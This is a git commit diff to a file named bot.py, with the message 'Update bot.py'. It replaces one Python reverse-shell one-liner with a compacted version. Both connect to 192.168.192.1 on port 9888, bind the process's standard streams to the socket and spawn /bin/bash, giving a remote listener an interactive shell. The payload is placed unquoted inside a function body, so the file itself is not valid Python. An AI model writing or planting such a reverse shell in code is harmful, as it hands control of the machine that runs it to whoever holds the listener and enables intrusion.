eefb3f0756cf3dc31d589e6a7b93a1767a99bf24
lauraalmrui <83592959+lauraalmrui@users.noreply.github.com>
2024-01-29 19:06:36 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,5 +1,5 @@
 import socket
 import subprocess
 def run():
- python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.192.1",9888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+ python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.192.1",9888));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
 
